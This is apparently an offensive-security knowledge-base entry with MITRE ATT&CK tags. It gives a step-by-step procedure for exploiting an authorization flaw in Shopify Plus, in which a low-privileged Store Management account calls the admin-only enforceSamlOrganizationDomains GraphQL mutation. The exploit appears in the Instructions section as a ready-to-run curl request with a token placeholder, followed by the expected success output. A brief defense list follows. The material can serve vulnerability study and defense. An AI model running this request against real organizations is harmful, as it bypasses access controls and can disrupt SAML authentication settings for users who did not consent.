---
tags:
  - graphql-mutation
  - saml-enforce
  - auth-bypass
  - shopify-plus
type: procedure
tools: []
tactics:
  - '[[Lateral Movement]]'
commands:
  - '[[commands/graphql-enforce-saml-domains]]'
platforms:
  - Web
  - Shopify Plus
techniques:
  - '[[Valid Accounts]]'
  - '[[Exploitation for Privilege Escalation]]'
skill_level: intermediate
impact_level: medium
detection_risk: high
sub_techniques: []
id: b252a9ff-0eed-4fca-8f7d-0bf47c2e3dba
created_at: '2025-12-14T17:29:20.182Z'
updated_at: '2025-12-14T17:29:20.182Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[Exploitation for Privilege Escalation]]'
---
# Execute-enforceSamlOrganizationDomains-Mutation

## Summary

This procedure executes the restricted `enforceSamlOrganizationDomains` GraphQL mutation using a low-privileged Store Management account, bypassing authorization to alter SAML configurations.

## Description

The core exploit: low-priv user enforces SAML domains organization-wide, a function meant for User Management only. Uses domain ID from prior query; targets /stores/api. Impact: Potential disruption to auth settings, though limited per report.

## Requirements

1. Domain ID from previous query
2. Active low-priv session
3. Proxy for mutation execution

## Defense

Defensive measures and detection strategies:

- Enforce strict RBAC on GraphQL mutations for SAML ops
- Monitor for mutations from non-User Management roles
- Require additional verification (e.g., MFA) for config changes

## Objectives

1. Bypass auth to execute admin-only mutation
2. Enforce SAML domains unauthorizedly
3. Validate improper authorization vulnerability

## Instructions

### Step 1: Prepare Mutation Payload

**Context**: Replace placeholder with actual domain ID.

**Command** (Payload Edit):

Edit the GraphQL query string with the ID, e.g., "gid://shopify/OrganizationDomain/123".

> Ensure domainIds array uses escaped quotes.

### Step 2: Send Mutation Request

**Context**: POST the mutation to enforce domains.

**Command** ([[commands/graphql-enforce-saml-domains]]):
```bash
curl -X POST 'https://shopify.plus/34946971/stores/api' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer YOUR_TOKEN' \
  -d '{"query":"mutation { enforceSamlOrganizationDomains(domainIds:[\"gid://shopify/OrganizationDomain/123\"]) { userErrors{message} } }"}'
```

> Expected output: JSON with empty userErrors on success, e.g., {"data":{"enforceSamlOrganizationDomains":{"userErrors":[]}}}. Failure would show permission errors, but exploit succeeds.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]]

### Techniques

- [[Valid Accounts]]
- [[Exploitation for Privilege Escalation]]

### Sub-Techniques


## Commands Used

- [[commands/graphql-enforce-saml-domains]]

## Tools Used


## Tags

- [[graphql-mutation]]
- [[saml-enforce]]
